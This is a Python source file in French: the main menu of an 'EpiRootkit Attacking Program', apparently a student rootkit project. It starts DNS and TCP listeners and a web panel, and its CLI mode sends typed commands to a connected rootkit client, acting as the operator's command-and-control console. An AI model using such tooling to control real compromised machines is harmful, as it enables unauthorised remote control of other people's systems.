from utils.dns import start_dns_server
from utils.server.TCPServer import TCPServer
import config as cfg
import threading
from app import app

# -------------------------------- MAIN MENU -------------------------------- #
            
def main():
    print("""
=== 🎛️ EpiRootkit Attacking Program ===
1. 🖥️ Mode CLI
2. 🌐 Mode Web
3. 🧪 Mode Application (à venir)
""")
    ####################################################################
    # CLI is BAD, need to correct and to adapt with DNS and all commands
    ####################################################################
    choix = input("Choix du mode (1/2/3) > ").strip()
    if choix == '1':
        run_cli()
    elif choix == '2':
        start_dns_server()
        cfg.rootkit_connexion = TCPServer(host=cfg.HOST, port=cfg.PORT)
        threading.Thread(target=cfg.rootkit_connexion.start, daemon=True).start()
        app.run(host='0.0.0.0', port=5000)
    elif choix == '3':
        print("🔧 Mode application pas encore implémenté.")
    else:
        print("❌ Choix invalide.")

# -------------------------------- RUN CLI -------------------------------- #

def run_cli():
    start_dns_server()
    cfg.rootkit_connexion = TCPServer(host=cfg.HOST, port=cfg.PORT)
    cfg.rootkit_connexion.start()
    while(cfg.rootkit_connexion._running):
        try:
            cmd = input("EpiRootkit> ").strip()
            if cmd.lower() in ['exit', 'quit']:
                cfg.rootkit_connexion.stop()
                break
            elif cmd:
                cfg.rootkit_connexion.send_to_client(cmd)
        except KeyboardInterrupt:
            print("\nExiting...")
            cfg.rootkit_connexion.stop()
            break

if __name__ == '__main__':
    main()